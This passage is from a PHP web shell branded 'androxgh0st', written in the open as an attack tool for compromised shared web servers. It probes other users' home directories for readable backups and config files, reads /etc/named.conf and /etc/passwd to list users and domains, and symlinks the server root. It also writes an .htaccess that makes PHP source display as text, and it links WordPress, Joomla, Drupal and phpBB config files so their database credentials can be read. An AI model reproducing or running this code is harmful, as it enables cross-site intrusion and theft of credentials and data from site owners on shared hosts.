  $dirs = '/home/'.$owner['name'].'/wp_backup';
  if (is_readable($dirs)) {
   echo "<font color='red'>[-]$dirs</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirt = '/home/'.$owner['name'].'/wp_backups';
  if (is_readable($dirt)) {
   echo "<font color='red'>[-]<a href='?path=$dirt' target='_blank'><u>$dirt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diru = '/home/'.$owner['name'].'/public_html.older/';
  if (is_readable($diru)) {
   echo "<font color='red'>[-]$diru</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirv = '/home/'.$owner['name'].'/db';
  if (is_readable($dirv)) {
   echo "<font color='red'>[-]<a href='?path=$dirv' target='_blank'><u>$dirv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirw = '/home/'.$owner['name'].'/database';
  if (is_readable($dirw)) {
   echo "<font color='red'>[-]<a href='?path=$dirw' target='_blank'><u>$dirw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirx = '/home/'.$owner['name'].'/homedir';
  if (is_readable($dirx)) {
   echo "<font color='red'>[-]<a href='?path=$dirx' target='_blank'><u>$dirx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diry = '/home/'.$owner['name'].'/backup_1';
  if (is_readable($diry)) {
   echo "<font color='red'>[-]$diry</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirz = '/home/'.$owner['name'].'/backup_public_html';
  if (is_readable($dirz)) {
   echo "<font color='red'>[-]$dirz</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirza = '/home/'.$owner['name'].'/BackupBuddy';
  if (is_readable($dirza)) {
   echo "<font color='red'>[-]<a href='?path=$dirza' target='_blank'><u>$dirza</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzb = '/home/'.$owner['name'].'/backup1';
  if (is_readable($dirzb)) {
   echo "<font color='red'>[-]<a href='?path=$dirzb' target='_blank'><u>$dirzb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzc = '/home/'.$owner['name'].'/wpbackup';
  if (is_readable($dirzc)) {
   echo "<font color='red'>[-]$dirzc</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzd = '/home/'.$owner['name'].'/wp-upgrade-backup';
  if (is_readable($dirzd)) {
   echo "<font color='red'>[-]<a href='?path=$dirzd' target='_blank'><u>$dirzd</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirze = '/home/'.$owner['name'].'/website_backup';
  if (is_readable($dirze)) {
   echo "<font color='red'>[-]<a href='?path=$dirze</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzf = '/home/'.$owner['name'].'/BACKUP';
  if (is_readable($dirzf)) {
   echo "<font color='red'>[-]<a href='?path=$dirzf' target='_blank'><u>$dirzf</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzg = '/home/'.$owner['name'].'/quarantine';
  if (is_readable($dirzg)) {
   echo "<font color='red'>[-]<a href='?path=$dirzg' target='_blank'><u>$dirzg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzh = '/home/'.$owner['name'].'/backup2';
  if (is_readable($dirzh)) {
   echo "<font color='red'>[-]<a href='?path=$dirzh' target='_blank'><u>$dirzh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzi = '/home/'.$owner['name'].'/'.$domain.zip;
  if (is_readable($dirzi)) {
   echo "<font color='red'>[-]<a href='?path=$dirzi' target='_blank'><u>$dirzi</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzj = '/home/'.$owner['name'].'/MyBackup';
  if (is_readable($dirzj)) {
   echo "<font color='red'>[-]$dirzj</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzk = '/home/'.$owner['name'].'/mybackup';
  if (is_readable($dirzk)) {
   echo "<font color='red'>[-]$dirzk</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzl = '/home/'.$owner['name'].'/backups1';
  if (is_readable($dirzl)) {
   echo "<font color='red'>[-]<a href='?path=$dirzl' target='_blank'><u>$dirzl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzm = '/home/'.$owner['name'].'/backups2';
  if (is_readable($dirzm)) {
   echo "<font color='red'>[-]<a href='?path=$dirzm' target='_blank'><u>$dirzm</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzn = '/home/'.$owner['name'].'/scriptupdate1';
  if (is_readable($dirzn)) {
   echo "<font color='red'>[-]$dirzn</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzo = '/home/'.$owner['name'].'/scriptupdate2';
  if (is_readable($dirzo)) {
   echo "<font color='red'>[-]$dirzo</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzp = '/home/'.$owner['name'].'/cobian_backups';
  if (is_readable($dirzp)) {
   echo "<font color='red'>[-]$dirzp</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzq = '/home/'.$owner['name'].'/fantastico_backups1';
  if (is_readable($dirzq)) {
   echo "<font color='red'>[-]<a href='?path=$dirzq' target='_blank'><u>$dirzq</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzr = '/home/'.$owner['name'].'/cobian_backup';
  if (is_readable($dirzr)) {
   echo "<font color='red'>[-]<a href='?path=$dirzr' target='_blank'><u>$dirzr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzs = '/home/'.$owner['name'].'/application_backups';
  if (is_readable($dirzs)) {
   echo "<font color='red'>[-]<a href='?path=$dirzs' target='_blank'><u>$dirzs</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzt = '/home/'.$owner['name'].'/public_html/';
  if (is_readable($dirzt)) {
   echo "<font color='red'>[-]<a href='?path=$dirzt' target='_blank'><u>$dirzt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzu = '/home/'.$owner['name'].'/public_html.bak1/';
  if (is_readable($dirzu)) {
   echo "<font color='red'>[-]<a href='?path=$dirzu' target='_blank'><u>$dirzu</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzv = '/home/'.$owner['name'].'/public_html.backup/';
  if (is_readable($dirzv)) {
   echo "<font color='red'>[-]<a href='?path=$dirzv' target='_blank'><u>$dirzv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzw = '/home/'.$owner['name'].'/public_html.backups/';
  if (is_readable($dirzw)) {
   echo "<font color='red'>[-]<a href='?path=$dirzw' target='_blank'><u>$dirzw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzx = '/home/'.$owner['name'].'/SiteBackup';
  if (is_readable($dirzx)) {
   echo "<font color='red'>[-]<a href='?path=$dirzx' target='_blank'><u>$dirzx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzy = '/home/'.$owner['name'].'/SiteBackups';
  if (is_readable($dirzy)) {
   echo "<font color='red'>[-]<a href='?path=$dirzy' target='_blank'><u>$dirzy</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirzz = '/home/'.$owner['name'].'/softaculous_backups';
  if (is_readable($dirzz)) {
   echo "<font color='red'>[-]<a href='?path=$$dirzz' target='_blank'><u>$dirzz</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirya = '/home/'.$owner['name'].'/backupwp';
  if (is_readable($dirya)) {
   echo "<font color='red'>[-]<a href='?path=$dirya' target='_blank'><u>$dirya</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryb = '/home/'.$owner['name'].'/backwpup';
  if (is_readable($diryb)) {
   echo "<font color='red'>[-]<a href='?path=$diryb' target='_blank'><u>$diryb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryc = '/home/'.$owner['name'].'/public_htmlfirstaid';
  if (is_readable($diryc)) {
   echo "<font color='red'>[-]<a href='?path=$diryc' target='_blank'><u>$diryc</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryd = '/home/'.$owner['name'].'/site';
  if (is_readable($diryd)) {
   echo "<font color='red'>[-]<a href='?path=$diryd' target='_blank'><u>$diryd</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirye = '/home/'.$owner['name'].'/backuppro';
  if (is_readable($dirye)) {
   echo "<font color='red'>[-]<a href='?path=$dirye' target='_blank'><u>$dirye</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryf = '/home/'.$owner['name'].'/BackupPro';
  if (is_readable($diryf)) {
   echo "<font color='red'>[-]<a href='?path=$diryf' target='_blank'><u>$diryf</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryg = '/home/'.$owner['name'].'/old.public_html';
  if (is_readable($diryg)) {
   echo "<font color='red'>[-]<a href='?path=$diryg' target='_blank'><u>$diryg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryh = '/home/'.$owner['name'].'/publi';
  if (is_readable($diryh)) {
   echo "<font color='red'>[-]<a href='?path=$diryh' target='_blank'><u>$diryh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryi = '/home/'.$owner['name'].'/update';
  if (is_readable($diryi)) {
   echo "<font color='red'>[-]<a href='?path=$diryi' target='_blank'><u>$diryi</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryj = '/home/'.$owner['name'].'/wordpress.bak';
  if (is_readable($diryj)) {
   echo "<font color='red'>[-]<a href='?path=$diryj' target='_blank'><u>$diryj</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryk = '/home/'.$owner['name'].'/.backup';
  if (is_readable($diryk)) {
   echo "<font color='red'>[-]<a href='?path=$diryk' target='_blank'><u>$diryk</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryl = '/home/'.$owner['name'].'/.backups';
  if (is_readable($diryl)) {
   echo "<font color='red'>[-]<a href='?path=$diryl' target='_blank'><u>$diryl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirym = '/home/'.$owner['name'].'/.accesshash';
  if (is_readable($dirym)) {
   echo "<font color='red'>[-]<a href='?path=$dirym' target='_blank'><u>$dirym</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryn = '/home/'.$owner['name'].'/migration';
  if (is_readable($diryn)) {
   echo "<font color='red'>[-]<a href='?path=$diryn' target='_blank'><u>$diryn</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryo = '/home/'.$owner['name'].'/html';
  if (is_readable($diryo)) {
   echo "<font color='red'>[-]<a href='?path=$diryo' target='_blank'><u>$diryo</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryp = '/home/'.$owner['name'].'/restore';
  if (is_readable($diryp)) {
   echo "<font color='red'>[-]<a href='?path=$diryp' target='_blank'><u>$diryp</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryq = '/home/'.$owner['name'].'/hosting';
  if (is_readable($diryq)) {
   echo "<font color='red'>[-]<a href='?path=$diryq' target='_blank'><u>$diryq</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryr = '/home/'.$owner['name'].'/wp';
  if (is_readable($diryr)) {
   echo "<font color='red'>[-]<a href='?path=$diryr' target='_blank'><u>$diryr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirys = '/home/'.$owner['name'].'/shop';
  if (is_readable($dirys)) {
   echo "<font color='red'>[-]<a href='?path=$dirys' target='_blank'><u>$dirys</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryt = '/home/'.$owner['name'].'/distrib';
  if (is_readable($diryt)) {
   echo "<font color='red'>[-]<a href='?path=$diryt' target='_blank'><u>$diryt</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryu = '/home/'.$owner['name'].'/test';
  if (is_readable($diryu)) {
   echo "<font color='red'>[-]<a href='?path=$diryu' target='_blank'><u>$diryu</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryv = '/home/'.$owner['name'].'/hg_backup';
  if (is_readable($diryv)) {
   echo "<font color='red'>[-]<a href='?path=$diryv' target='_blank'><u>$diryv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryw = '/home/'.$owner['name'].'/public_html1';
  if (is_readable($diryw)) {
   echo "<font color='red'>[-]<a href='?path=$diryw' target='_blank'><u>$diryw</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryx = '/home/'.$owner['name'].'/backups-manual';
  if (is_readable($diryx)) {
   echo "<font color='red'>[-]<a href='?path=$diryx' target='_blank'><u>$diryx</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryy = '/home/'.$owner['name'].'/public_html_upgraded';
  if (is_readable($diryy)) {
   echo "<font color='red'>[-]<a href='?path=$diryy' target='_blank'><u>$diryy</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diryz = '/home/'.$owner['name'].'/olllld.public_html';
  if (is_readable($diryz)) {
   echo "<font color='red'>[-]<a href='?path=$diryz' target='_blank'><u>$diryz</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dir1 = '/home/'.$owner['name'].'/mysql';
  if (is_readable($dir1)) {
   echo "<font color='red'>[-]<a href='?path=$dir1' target='_blank'><u>$dir1</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dir2 = '/home/'.$owner['name'].'/public_html_off/';
  if (is_readable($dir2)) {
   echo "<font color='red'>[-]<a href='?path=$dir2' target='_blank'><u>$dir2</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dir3 = '/home/'.$owner['name'].'/wpdbbackup/';
  if (is_readable($dir3)) {
   echo "<font color='red'>[-]<a href='?path=$dir3' target='_blank'><u>$dir3</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dir4 = '/home/'.$owner['name'].'/wp backup/';
  if (is_readable($dir4)) {
   echo "<font color='red'>[-]<a href='?path=$dir4' target='_blank'><u>$dir4</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dir5 = '/home/'.$owner['name'].'/backupwordpress.zip';
  if (is_readable($dir5)) {
   echo "<font color='red'>[-]<a href='?path=$dir5' target='_blank'><u>$dir5</u></a></font> -> <font color='blue'>".$domain."</font><br>";
   }
  $dir5i = '/home/'.$owner['name'].'/backupwp.zip';
  if (is_readable($dir5i)) {
   echo "<font color='red'>[-]<a href='?path=$dir5i' target='_blank'><u>$dir5i</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }
  $dir6 = '/home/'.$owner['name'].'/backupjoomla.zip';
  if (is_readable($dir6)) {
   echo "<font color='red'>[-]<a href='?path=$dir6' target='_blank'><u>$dir6</u></a></font> -> <font color='blue'>".$domain."</font><br>";
     }
  $dir7 = '/home/'.$owner['name'].'/sites.zip';
  if (is_readable($dir7)) {
   echo "<font color='red'>[-]<a href='?path=$dir7' target='_blank'><u>$dir7</u></a></font> -> <font color='blue'>".$domain."</font><br>";
     }	
  $dir8 = '/home/'.$owner['name'].'/dbconnect-backup.tar';
  if (is_readable($dir8)) {
   echo "<font color='red'>[-]<a href='?path=$dir8' target='_blank'><u>$dir8</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir9 = '/home/'.$owner['name'].'/filelist.txt';
  if (is_readable($dir9)) {
   echo "<font color='red'>[-]<a href='?path=$dir9' target='_blank'><u>$dir9</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir10 = '/home/'.$owner['name'].'/public_html2';
  if (is_readable($dir10)) {
   echo "<font color='red'>[-]<a href='?path=$dir10' target='_blank'><u>$dir10</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir11 = '/home/'.$owner['name'].'/www.zip';
  if (is_readable($dir11)) {
   echo "<font color='red'>[-]<a href='?path=$dir11' target='_blank'><u>$dir11</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir12 = '/home/'.$owner['name'].'/backup.tar.gz';
  if (is_readable($dir12)) {
   echo "<font color='red'>[-]<a href='?path=$dir12' target='_blank'><u>$dir12</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir13 = '/home/'.$owner['name'].'/backup2014';
  if (is_readable($dir13)) {
   echo "<font color='red'>[-]<a href='?path=$dir13' target='_blank'><u>$dir13</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir14 = '/home/'.$owner['name'].'/backup2015';
  if (is_readable($dir14)) {
   echo "<font color='red'>[-]<a href='?path=$dir14' target='_blank'><u>$dir14</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir15 = '/home/'.$owner['name'].'/backup2016';
  if (is_readable($dir15)) {
   echo "<font color='red'>[-]<a href='?path=$dir15' target='_blank'><u>$dir15</u></a></font> -> <font color='blue'>".$domain."</font><br>";
     }	
  $dir16 = '/home/'.$owner['name'].'/wp-config.php';
  if (is_readable($dir16)) {
   echo "<font color='red'>[-]<a href='?path=$dir16' target='_blank'><u>$dir16</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir17 = '/home/'.$owner['name'].'/wp-config.php.bak';
  if (is_readable($dir17)) {
   echo "<font color='red'>[-]<a href='?path=$dir8' target='_blank'><u>$dir17</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir18 = '/home/'.$owner['name'].'/wp-config.txt';
  if (is_readable($dir18)) {
   echo "<font color='red'>[-]<a href='?path=$dir18' target='_blank'><u>$dir18</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir19 = '/home/'.$owner['name'].'/public_html.backups';
  if (is_readable($dir19)) {
   echo "<font color='red'>[-]<a href='?path=$dir19' target='_blank'><u>$dir19</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir20 = '/home/'.$owner['name'].'/public_html.backup';
  if (is_readable($dir20)) {
   echo "<font color='red'>[-]<a href='?path=$dir20' target='_blank'><u>$dir20</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir21 = '/home/'.$owner['name'].'/public_html.new';
  if (is_readable($dir21)) {
   echo "<font color='red'>[-]<a href='?path=$dir21' target='_blank'><u>$dir21</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir22 = '/home/'.$owner['name'].'/BackUpWordPress';
  if (is_readable($dir22)) {
   echo "<font color='red'>[-]<a href='?path=$dir22' target='_blank'><u>$dir22</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir23 = '/home/'.$owner['name'].'/BackUp';
  if (is_readable($dir23)) {
   echo "<font color='red'>[-]<a href='?path=$dir23' target='_blank'><u>$dir23</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir24 = '/home/'.$owner['name'].'/backupnew';
  if (is_readable($dir24)) {
   echo "<font color='red'>[-]<a href='?path=$dir24' target='_blank'><u>$dir24</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir25 = '/home/'.$owner['name'].'/public_html.wordpress';
  if (is_readable($dir25)) {
   echo "<font color='red'>[-]<a href='?path=$dir25' target='_blank'><u>$dir25</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir26 = '/home/'.$owner['name'].'/public_html.joomla';
  if (is_readable($dir26)) {
   echo "<font color='red'>[-]<a href='?path=$dir26' target='_blank'><u>$dir26</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir27 = '/home/'.$owner['name'].'/backup.wordpress';
  if (is_readable($dir27)) {
   echo "<font color='red'>[-]<a href='?path=$dir27' target='_blank'><u>$dir27</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir28 = '/home/'.$owner['name'].'/backup.joomla';
  if (is_readable($dir28)) {
   echo "<font color='red'>[-]<a href='?path=$dir28' target='_blank'><u>$dir28</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir29 = '/home/'.$owner['name'].'/joomla.tar';
  if (is_readable($dir29)) {
   echo "<font color='red'>[-]<a href='?path=$dir29' target='_blank'><u>$dir29</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir30 = '/home/'.$owner['name'].'/configuration.php';
  if (is_readable($dir30)) {
   echo "<font color='red'>[-]<a href='?path=$dir30' target='_blank'><u>$dir30</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir31 = '/home/'.$owner['name'].'/config.php';
  if (is_readable($dir31)) {
   echo "<font color='red'>[-]<a href='?path=$dir31' target='_blank'><u>$dir31</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir32 = '/home/'.$owner['name'].'/www.bak';
  if (is_readable($dir8)) {
   echo "<font color='red'>[-]<a href='?path=$dir32' target='_blank'><u>$dir32</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir33 = '/home/'.$owner['name'].'/public_htmlbak';
  if (is_readable($dir33)) {
   echo "<font color='red'>[-]<a href='?path=$dir33' target='_blank'><u>$dir33</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir34 = '/home/'.$owner['name'].'/public_htmlbackup';
  if (is_readable($dir34)) {
   echo "<font color='red'>[-]<a href='?path=$dir34' target='_blank'><u>$dir34</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir35 = '/home/'.$owner['name'].'/backups.tar.gz';
  if (is_readable($dir35)) {
   echo "<font color='red'>[-]<a href='?path=$dir35' target='_blank'><u>$dir35</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir36 = '/home/'.$owner['name'].'/old.zip';
  if (is_readable($dir36)) {
   echo "<font color='red'>[-]<a href='?path=$dir36' target='_blank'><u>$dir36</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir37 = '/home/'.$owner['name'].'/blog.zip';
  if (is_readable($dir37)) {
   echo "<font color='red'>[-]<a href='?path=$dir37' target='_blank'><u>$dir37</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir38 = '/home/'.$owner['name'].'/shop.zip';
  if (is_readable($dir38)) {
   echo "<font color='red'>[-]<a href='?path=$dir38' target='_blank'><u>$dir38</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir39 = '/home/'.$owner['name'].'/public_html_old.zip';
  if (is_readable($dir39)) {
   echo "<font color='red'>[-]<a href='?path=$dir39' target='_blank'><u>$dir39</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir40 = '/home/'.$owner['name'].'/settings.php';
  if (is_readable($dir40)) {
   echo "<font color='red'>[-]<a href='?path=$dir40' target='_blank'><u>$dir40</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir41 = '/home/'.$owner['name'].'/new_backup';
  if (is_readable($dir41)) {
   echo "<font color='red'>[-]<a href='?path=$dir41' target='_blank'><u>$dir41</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir42 = '/home/'.$owner['name'].'/backup_joomla';
  if (is_readable($dir42)) {
   echo "<font color='red'>[-]<a href='?path=$dir42' target='_blank'><u>$dir42</u></a></font> -> <font color='blue'>".$domain."</font><br>";
    }	
  $dir43 = '/home/'.$owner['name'].'/backup_wordpress';
  if (is_readable($dir43)) {
   echo "<font color='red'>[-]<a href='?path=$dir43' target='_blank'><u>$dir43</u></a></font> -> <font color='blue'>".$domain."</font><br>";                                                                                                         
  }	
 }
}
if($i == 0) { echo '<br>Readable Users Path Is Empty!'; } else { echo "<br>Total ".$i." Readable Users Path in ".gethostbyname($_SERVER['HTTP_HOST'])."."; }
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("androxgh0st_sym",0777);
@chdir("androxgh0st_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
HeaderName wp-config.php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(preg_match("/zone/i",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/androxgh0st_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("androxgh0st_sym",0777);
@chdir("androxgh0st_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/androxgh0st_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("androxgh0st_sym",0777);@chdir("androxgh0st_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='androxgh0st'>Server Symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/androxgh0st_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Gabisa buat Symlink, Jancok!</font></center>";
 }
 }    
}

elseif($_GET['do'] == 'config2') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("androxgh0st_symvhosts", 0777);
exe("ln -s / androxgh0st_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("androxgh0st_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php androxgh0st_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php androxgh0st_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php androxgh0st_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php androxgh0st_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php androxgh0st_symvhosts/".$jembod."-Drupal.txt");
